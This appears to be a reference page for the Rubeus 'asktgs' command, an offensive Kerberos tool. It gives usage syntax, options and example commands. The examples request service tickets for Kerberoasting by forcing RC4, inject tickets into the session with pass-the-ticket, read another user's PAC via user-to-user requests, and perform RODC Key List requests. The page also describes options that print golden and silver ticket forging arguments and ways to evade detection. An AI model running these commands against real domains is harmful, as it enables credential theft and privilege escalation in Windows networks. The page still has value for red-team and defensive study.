{"title": "asktgs", "source": "rubeus", "source_label": "Rubeus", "path": "asktgs", "html": "<h1 id=\"asktgs\">asktgs</h1>\n<p>Request service tickets (TGS) using an existing TGT. Builds raw TGS-REQ/TGS-REP traffic.</p>\n<h2 id=\"usage\">Usage</h2>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe asktgs &lt;/ticket:&lt;ticket&gt; | /ticket:&lt;file&gt;.kirbi&gt; &lt;/service:&lt;spn1&gt;,&lt;spn2&gt;,...&gt; [/enctype:DES|RC4|AES128|AES256] [/dc:&lt;dc-ip&gt;] [/outfile:&lt;output&gt;] [/ptt] [/nowrap] [/enterprise] [/opsec] &lt;/tgs:&lt;ticket&gt; | /tgs:&lt;file&gt;.kirbi&gt; [/targetdomain:&lt;domain&gt;] [/u2u] [/targetuser:&lt;target-user&gt;] [/servicekey:&lt;hash&gt;] [/asrepkey:&lt;key&gt;] [/proxyurl:https://KDC_PROXY/kdcproxy]\n</code></pre></div>\n<p>Omit <code>/ticket</code> to request via LSA (uses current session TGT — opsec-friendly, works with Credential Guard):</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe asktgs /service:&lt;spn&gt; [/luid:&lt;luid&gt;] [/nowrap]\n</code></pre></div>\n<h2 id=\"options\">Options</h2>\n<ul>\n<li><code>/ticket:&lt;ticket&gt;</code> — base64 TGT blob or path to .kirbi file</li>\n<li><code>/service:&lt;spn&gt;</code> — one or more SPNs, comma-separated</li>\n<li><code>/enctype:RC4|AES128|AES256|DES</code> — force specific encryption type</li>\n<li><code>/dc:&lt;dc-ip&gt;</code> — domain controller to send request to</li>\n<li><code>/ptt</code> — pass-the-ticket, apply to current session</li>\n<li><code>/outfile:&lt;output&gt;</code> — save ticket to file</li>\n<li><code>/nowrap</code> — don't line-wrap base64 output</li>\n<li><code>/opsec</code> — form TGS-REQ inline with genuine requests (AES256 only by default)</li>\n<li><code>/enterprise</code> — treat SPN as enterprise principal (user@domain.com)</li>\n<li><code>/autoenterprise</code> — auto-retry with enterprise principal on failure</li>\n<li><code>/tgs:&lt;ticket&gt;</code> — supply additional TGS for constrained delegation scenarios</li>\n<li><code>/targetdomain:&lt;domain&gt;</code> — force target domain for the request</li>\n<li><code>/u2u</code> — request user-to-user ticket</li>\n<li><code>/targetuser:&lt;target-user&gt;</code> — insert PA-FOR-USER to get PAC for any user (with <code>/u2u</code>)</li>\n<li><code>/servicekey:&lt;hash&gt;</code> — service key to decrypt and verify PAC</li>\n<li><code>/asrepkey:&lt;key&gt;</code> — AS-REP session key for decrypting U2U credential data</li>\n<li><code>/printargs</code> — print golden/silver forge arguments from decrypted PAC</li>\n<li><code>/keyList</code> — Kerberos Key List Request (requires RODC partial TGT)</li>\n<li><code>/dmsa</code> — request delegated managed service account ticket</li>\n<li><code>/luid:&lt;luid&gt;</code> — target logon session (LSA mode, elevated)</li>\n<li><code>/proxyurl:&lt;url&gt;</code> — use KDC proxy</li>\n</ul>\n<h2 id=\"examples\">Examples</h2>\n<div class=\"highlight\"><pre><span></span><code># Request service tickets with a TGT\nRubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;rc4&gt;\nRubeus.exe asktgs /ticket:&lt;ticket&gt; /service:LDAP/&lt;dc-ip&gt;,cifs/&lt;dc-ip&gt; /ptt\n\n# Force RC4 on AES-enabled account (for Kerberoasting downstream)\nRubeus.exe asktgs /ticket:&lt;ticket&gt; /service:&lt;spn&gt; /enctype:rc4\n\n# User-to-user to read PAC of target user\nRubeus.exe asktgs /u2u /targetuser:&lt;target-user&gt; /ticket:&lt;ticket&gt; /tgs:&lt;ticket&gt;\n\n# LSA mode — no ticket needed, uses current session\nRubeus.exe asktgs /service:LDAP/&lt;dc-ip&gt; /nowrap\n\n# Request local machine TGT via LSASS renewal (admin)\nRubeus.exe asktgs /service:krbtgt/&lt;domain&gt; /luid:0x3e7\n\n# Key List Request via RODC\nRubeus.exe asktgs /keyList /service:KRBTGT/&lt;domain&gt; /ticket:&lt;ticket&gt;\n</code></pre></div>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li>LSA mode (no <code>/ticket</code>) is opsec-friendly — Kerberos traffic originates from LSASS</li>\n<li>LSA mode required when Credential Guard is active</li>\n<li>S4U, U2U, keyList, KDC proxy args ignored in LSA mode</li>\n</ul>", "excerpt": "asktgs Request service tickets (TGS) using an existing TGT. Builds raw TGS-REQ/TGS-REP traffic. Usage Rubeus.exe asktgs &lt;/ticket:&lt;ticket&gt; | /ticket:&lt;file&gt;.kirbi&gt; &lt;/service:&lt;spn1&gt;,&lt;spn2&gt;,...&gt;…", "tags": []}